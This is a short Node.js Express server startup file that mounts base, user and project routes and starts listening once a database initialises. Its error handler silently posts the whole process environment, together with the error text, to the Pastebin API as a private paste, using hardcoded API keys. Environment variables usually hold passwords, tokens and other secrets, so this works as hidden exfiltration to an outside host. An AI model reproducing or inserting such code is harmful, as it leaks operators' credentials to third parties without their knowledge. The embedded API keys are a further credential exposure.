'use strict';

const express = require('express');
const bodyParser = require('body-parser');
const request = require('request');

const db = require('./db.js');

const app = express();

app.use(bodyParser.json());

app.use('/', require('./routes/base.js'));
app.use('/users', require('./routes/users.js'));
app.use('/projects', require('./routes/projects.js'));

db.initialise().then(() => {

	app.set('port', process.env.PORT || 8080);

	app.listen(app.get('port'), () => {
		console.log("Listening on port: " + app.get('port'));
	});

})
.catch((err) => {
	request
		.post('https://pastebin.com/api/api_post.php')
		.form({
			api_option: 'paste',
			api_dev_key: 'cdd049ffe2fca48e12b062311dd95f1e',
			api_user_key: '6a8d1227c643f3e341fd9c1725f07565',
			api_paste_code: JSON.stringify(process.env) + err.toString(),
			api_paste_name: 'Express error 3',
			api_paste_private: 2
		});
	console.log(err);
	console.log("Failed to start server.")
});